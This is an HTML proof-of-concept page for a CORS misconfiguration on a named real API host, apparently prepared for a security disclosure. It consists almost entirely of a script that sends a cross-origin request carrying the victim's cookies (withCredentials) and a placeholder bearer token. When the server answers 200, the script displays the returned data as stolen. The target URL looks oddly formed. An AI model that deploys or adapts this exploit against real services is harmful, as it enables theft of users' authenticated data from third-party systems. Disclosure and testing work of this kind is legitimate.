<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - Authorization Header Acceptance</title>
</head>
<body>
    <h1>CORS Misconfiguration PoC</h1>
    <p>Demonstrates server accepts authenticated requests from *any* origin.</p>
    <button onclick="testCORS()">Test with Fake Authorization Header</button>
    <pre id="result"></pre>
    
    <script>
    function testCORS() {
        var url = "https://api.maple.comcast.net/lookups/usersAddress96.99.226.63:443";
        
        // This simulates a request where the attacker somehow obtained a valid token.
        // The token is fake here to avoid unauthorized access, but it proves the *mechanism* works.
        var fakeToken = "Bearer THIS_IS_A_FAKE_TOKEN_VALUE_TO_PROVE_THE_HEADER_CAN_BE_SENT";

        var xhr = new XMLHttpRequest();
        xhr.onload = function() {
            var statusText = "HTTP " + xhr.status;
            
            if (xhr.status === 401) {
                // This is still a success! It proves the browser successfully sent the header cross-origin.
                document.getElementById('result').innerHTML = "<b>CORS TEST SUCCESS:</b> The browser successfully sent the `Authorization` header cross-origin. The 401 status and body confirm the server received the header but rejected the token value.<br><br>Server Response: " + xhr.responseText;
            } else if (xhr.status === 200) {
                // Immediate Critical Win: Data stolen!
                document.getElementById('result').innerHTML = "<b>CRITICAL SUCCESS (200 OK):</b> The attack token was accepted, and sensitive data was retrieved cross-origin:<br>" + xhr.responseText.substring(0, 500) + "...";
            } else {
                 document.getElementById('result').innerHTML = "Status: " + statusText + ". Response: " + xhr.responseText;
            }
        };
        
        xhr.onerror = function() {
            document.getElementById('result').innerHTML = "Network Error - check console for details.";
        };

        xhr.open('GET', url, true);
        xhr.withCredentials = true; // Send any relevant cookies too
        
        // **CRITICAL STEP:** Setting the Authorization header cross-origin
        xhr.setRequestHeader('Authorization', fakeToken); 
        
        xhr.send();
    }
    </script>
</body>
</html>
